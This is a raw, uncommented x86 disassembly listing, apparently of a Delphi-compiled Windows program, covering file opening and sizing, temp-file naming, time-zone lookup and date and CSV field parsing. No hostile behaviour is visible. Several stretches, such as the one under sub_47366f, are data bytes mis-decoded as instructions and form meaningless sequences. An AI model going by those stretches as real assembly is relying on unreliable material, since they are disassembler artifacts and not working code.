lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405400
retn
sub_472f64
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_472ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_471cb4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473005
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_47300c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_473028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4730de
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4730c1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4730c8
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_4730f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4731b3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x8 ]
call sub_408648
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0xc ]
call sub_408648
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x10 ]
call sub_408648
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x14 ]
call sub_408648
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4731ba
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40413c
retn
sub_4731d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473266
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_471cb4
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_40416c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47326d
lea eax [ ebp - 0x18 ]
call sub_404118
retn
sub_473278
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473306
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_471cb4
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_40416c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47330d
lea eax [ ebp - 0x18 ]
call sub_404118
retn
sub_473318
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_473338
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_473392
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473399
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_4733a0
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_4733fa
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473401
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_473408
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_47343c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4734dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_471e78
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4734e4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409280
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40416c
sub_4734ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473525
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47352c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_47355c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473581
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473588
retn
sub_47366f
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ esi + esi + 0x47 ] bh
add [ ebx ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
aaa
inc edi
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6c ] ch
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] dh
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x36 ] bh
inc edi
add [ ebx ] cl
insd
popad
inc ebp
js r-xdata
cmp [ eax + eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
enter 0x4737 0x0
adc [ ebx ] eax
xor [ cs : ecx ] dh
add al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
push ebx
je r-xdata
add [ ebp + esi * 4 - 0x441fffbf ] cl
inc ecx
add [ ecx + ecx * 2 + 0x47 ] al
add [ eax ] bl
sub [ ebp - 0x4a8bffbf ] dh
inc ecx
jo r-xdata
add [ ecx ] dl
add ch [ esi ]
popad
insd
xor [ edi ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004737 ] al
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] dh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] bl
inc ebp
dec ecx
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x65526f54
je r-xdata
add [ ebx ] dl
push esp
dec ecx
push edx
popad
dec ebp
insd
outsd
jb r-xdata
sbb [ ecx + eax * 2 + 0x41b6b000 ] bh
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
call sub_47423c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408684
mov edx [ ebp + 0x8 ]
mov [ edx - 0xa ] ax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4082d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47386a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
imul esi [ gs : esi + 0x65 ] 0x656d6954
pop edx
outsd
outsb
dec ecx
outsb
outsw
movsb [ edi ] [ esi ]
aaa
inc edi
mov esp 0xb6b00041
inc ecx
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
add al 0x37
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4737e8
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_473863
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
call sub_47423c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408684
mov edx [ ebp + 0x8 ]
mov [ edx - 0xa ] ax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4082d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47386a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_473870
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_4738eb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
call sub_47423c
mov eax [ ebp - 0x4 ]
call sub_474490
and eax 0xff
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] ax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4082d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4738f2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4738f8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473bab
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_408280
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_40416c
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4043d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473bb2
lea eax [ ebp - 0x40 ]
mov edx 0xa
call sub_40413c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
xor edx edx
push ebp
push j_sub_4037e4#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx 0x3
mov edx 0x1
call sub_404638
mov eax [ ebp - 0x24 ]
call sub_4743a0
test al al
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax r-xdata
call [ rw-data ]
dec eax
jle r-xdata
push 0x1
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4082d0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_40416c
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b0
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax r-xdata
call [ rw-data ]
mov ebx eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax r-xdata
call [ rw-data ]
cmp ebx eax
jge r-xdata
push ebp
call sub_4737e8
pop ecx
push ebp
call sub_473870
pop ecx
push ebp
call sub_473870
pop ecx
push ebp
call sub_4737e8
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
cmp bx 0x50
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx 0x76c
call sub_408684
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_40416c
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
mov cl 0x1
call sub_47423c
mov edx 0x76c
mov eax [ ebp - 0x1c ]
call sub_408684
mov ebx eax
cmp bx 0x76c
jne r-xdata
push 0x1
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
call sub_47423c
mov eax [ ebp - 0x30 ]
call sub_474490
test al al
jbe r-xdata
cmp bx 0x64
jae r-xdata
add bx 0x7d0
jmp r-xdata
mov cx [ ebp - 0xa ]
mov dx [ ebp - 0xc ]
mov eax ebx
call sub_409cf0
fstp [ ebp - 0x18 ]
fwait
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax r-xdata
call [ rw-data ]
test eax eax
jle r-xdata
add bx 0x76c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4082d0
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
push 0x1
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x34 ]
xor edx edx
call sub_408684
mov ebx eax
push 0x1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x1c ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408684
mov esi eax
push 0x1
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x1c ]
mov edx r-xdata
mov cl 0x1
call sub_47423c
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408684
mov edi eax
push 0x0
mov ecx edi
mov edx esi
mov eax ebx
call sub_409b50
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x18 ]
fwait
sub_473bfc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x40 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473ce1
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x6 ]
call sub_409e6c
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409f3c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
movzx eax [ ebp - 0x2 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x0
movzx eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
movzx eax [ ebp - 0x6 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_40ac50
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
call sub_47402c
add esp 0xfffffff8
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4745e4
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x5
mov eax r-xdata
call sub_409280
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ce8
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40413c
retn
sub_473e08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473ecf
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov ebx 0x1
mov eax esi
call sub_4043d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
cmp ebx [ ebp - 0x10 ]
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ed6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40413c
retn
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp ebx [ ebp - 0x10 ]
jg r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404638
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_408280
mov eax [ ebp - 0x14 ]
call sub_4043d8
test eax eax
jle r-xdata
mov al [ esi + ebx - 0x1 ]
cmp al 0x22
jne r-xdata
mov ebx [ ebp - 0xc ]
inc ebx
xor edi edi
cmp ebx [ ebp - 0x10 ]
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp al 0x2c
jne r-xdata
inc edi
inc [ ebp - 0xc ]
inc ebx
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp edi 0x1
jne r-xdata
sub_473ee0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473f3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_404764
mov eax [ ebx ]
call sub_4045d8
push eax
mov eax [ ebx ]
call sub_4043d8
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_404764
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_473be0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473f46
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_473f4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_473fe3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x105
call sub_404764
test esi esi
jbe r-xdata
mov eax [ ebx ]
call sub_4045d8
push eax
push 0x0
push r-xdata
mov eax [ rw-data ]
call sub_4045d8
push eax
call GetTempFileNameA
mov eax [ ebx ]
call sub_4045d8
push eax
push 0x0
push r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_473be0
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
call GetTempFileNameA
jmp r-xdata
mov eax [ ebx ]
call sub_4045d8
mov edx eax
mov eax ebx
call sub_404310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473fea
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_473ff8
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
sub eax 0x4
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x2
jne r-xdata
sub eax 0xd
je r-xdata
mov al 0x1
retn
xor eax eax
jmp r-xdata
mov al 0x2
retn
dec eax
je r-xdata
retn
mov al 0x3
retn
jmp r-xdata
mov al 0x4
sub_47402c
push ebp
mov ebp esp
add esp 0xffffff44
push ebx
push esi
xor eax eax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] eax
xor eax eax
push ebp
push sub_47413f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xb4 ]
push eax
call GetTimeZoneInformation
sub eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xb8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xb8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
dec eax
je r-xdata
push 0x0
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax ecx
mov esi 0x3c
cdq
idiv esi
push edx
mov eax ebx
cdq
xor eax edx
sub eax edx
mov eax ecx
mov ecx 0x3c
cdq
idiv ecx
xor ecx ecx
pop edx
call sub_409b50
fstp [ ebp - 0x8 ]
fwait
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0xb4 ]
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474146
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_40413c
retn
fld [ r-xdata ]
fsub [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0x60 ]
jmp r-xdata
dec eax
je r-xdata
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0xc ]
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0xbc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xbc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_474154
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47421d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404524
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_408064
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408064
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_40471c
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404638
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_40416c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474224
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
push ebx
mov eax edi
call sub_4043d8
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404638
mov eax ebx
call sub_404118
jmp r-xdata
sub_47423c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_474154
mov eax esi
mov edx r-xdata
call sub_404524
jne r-xdata
